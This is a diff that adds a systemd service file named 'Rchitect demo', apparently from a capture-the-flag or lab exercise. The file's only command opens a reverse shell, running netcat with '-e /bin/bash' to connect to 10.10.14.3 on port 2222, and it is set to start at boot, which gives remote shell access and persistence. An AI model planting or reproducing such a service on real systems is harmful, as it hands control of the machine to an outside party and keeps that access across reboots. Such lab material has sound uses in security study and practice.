@@ -1,0 +1,9 @@
+[Unit]
+Description=Rchitect demo
+StartLimitIntervalSec=0
+[Service]
+Type=simple
+user=root
+ExecStart=/bin/nc -e /bin/bash 10.10.14.3 2222
+[Install]
+WantedBy=multi-user.target
